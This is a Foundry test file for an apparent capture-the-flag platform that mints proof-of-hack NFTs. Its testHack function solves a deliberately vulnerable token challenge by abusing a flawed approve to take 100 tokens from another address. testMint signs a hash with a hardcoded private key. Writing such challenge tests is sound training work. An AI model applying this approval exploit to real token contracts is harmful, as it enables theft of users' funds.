// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/arbitrum/ProofOfHacker.sol";
import "../src/testnet/ChallengeFactory.sol";
import "../src/testnet/challenges/IChallengeFactory.sol";

import {FactoryChallenge0} from "../src/testnet/challenges/Challenge0.factory.sol";

contract ProofOfHackerTest is Test {
    ProofOfHacker public proofOfHacker;
    ChallengeFactory public factory;

    address minter;

    function setUp() public {
        // minter = 0x030f6a4c5baa7350405fa8122cf458070abd1b59
        minter = makeAddr("minter");
        proofOfHacker = new ProofOfHacker(minter);

        factory = new ChallengeFactory();
    }

    function testMint() public {
        address challenge = 0x5FbDB2315678afecb367f032d93F642f64180aa3;
        address player = 0x38c40EAd3D0Fe7959eb9DFE8337B3c4929884d2c;

        bytes memory code = address(proofOfHacker).code;
        vm.etch(0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0, code);
        proofOfHacker = ProofOfHacker(0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0);
        vm.prank(address(0));
        proofOfHacker.setMinter(0x18e3d8745a9b0C065309986acFE1d837bb7537cD);

        assertEq(proofOfHacker.minter(), 0x18e3d8745a9b0C065309986acFE1d837bb7537cD);

        string memory url = "ipfs://QmfF7Y4FEsPKpRc7z7Mc2Gub2DxNM58zAAq5JYTcNVqjU5";
        bytes32 hash = keccak256(abi.encodePacked(address(proofOfHacker), challenge, player, url));

        emit log_bytes32(bytes32(hash));

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(0x9308343e9a8d724ab4c5d6dd66d694eabae4ddb68752dd02f18006cb2b427cca, hash);
        console.log("v", v);
        emit log_bytes32(r);
        emit log_bytes32(s);

        proofOfHacker.mint(player, challenge, url, 
            bytes("0x06f908a61d06180253e600f63515f40cc093450b3d0d4bdd3a95759a91af973356d12fdad6e30abb713a886086001bd1866a5c50da3d9c1c5522dfacdb3919631b"));
    }

    function testHack() public {
        address challenge0 = address(new FactoryChallenge0());

        address player = makeAddr("player");
        vm.startPrank(player);
        assertEq(factory.getChallengesInstances(player, challenge0).length, 0);
        factory.deployChallenge(challenge0);
        assertEq(factory.getChallengesInstances(player, challenge0).length, 1);

        assertFalse(factory.checkChallenge(player, challenge0));

        address vtoken = factory.getChallengesInstances(player, challenge0)[0];

        address vitalik = 0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045;

        // HACK
        vtoken.call(abi.encodeWithSignature("approve(address,address,uint256)", vitalik, player, type(uint256).max));
        vtoken.call(abi.encodeWithSignature("transferFrom(address,address,uint256)", vitalik, player, 100 ether));

        assertTrue(factory.checkChallenge(player, challenge0));

        vm.stopPrank();
    }
}
